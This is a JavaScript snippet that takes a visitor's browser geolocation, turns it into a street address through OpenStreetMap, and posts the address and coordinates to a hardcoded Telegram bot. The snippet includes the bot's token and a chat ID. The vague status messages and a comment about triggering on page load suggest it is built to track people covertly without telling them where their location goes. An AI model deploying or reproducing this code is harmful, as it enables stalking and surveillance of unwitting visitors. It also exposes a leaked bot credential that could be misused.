    <script>


// Function to get location details from OpenStreetMap
function getLocationDetails(latitude, longitude) {
    const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;
    return fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.display_name) {
                return { address: data.display_name };
            } else {
                throw new Error("Unable to fetch address details.");
            }
        })
        .catch(error => {
            console.error("Error fetching location details:", error);
            return { address: "Unknown Location" };
        });
}

// Function to send location data to Telegram bot
function sendLocationToBot(latitude, longitude, location) {
    const formData = new FormData();
    formData.append('chat_id', '2032344793'); // Replace with your chat ID
    formData.append('text', `Location: ${location.address}\nCoordinates: ${latitude}, ${longitude}`);

    fetch('https://api.telegram.org/bot5836151829:AAGw120dHzCMh9UMj0loSHOu8lvvzg2yli0/sendMessage', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            document.getElementById('status').innerText = ' successfully!';
        } else {
            document.getElementById('status').innerText = 'Failed .';
            console.error("Telegram API error:", data);
        }
    })
    .catch(error => {
        document.getElementById('status').innerText = 'Error sending .';
        console.error('Error sending:', error);
    });
}

// Get the user's current location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // Fetch location details and send to bot
                getLocationDetails(latitude, longitude)
                    .then(locationDetails => {
                        sendLocationToBot(latitude, longitude, locationDetails);
                    })
                    .catch(error => {
                        console.error("Error fetching or sending location details:", error);
                    });
            },
            error => {
                alert("Error fetching location: " + error.message);
                console.error("Geolocation error:", error);
            }
        );
    } else {
        alert("Geolocation is not supported by your browser.");
    }
}

// Trigger the process when the page loads or a button is clicked
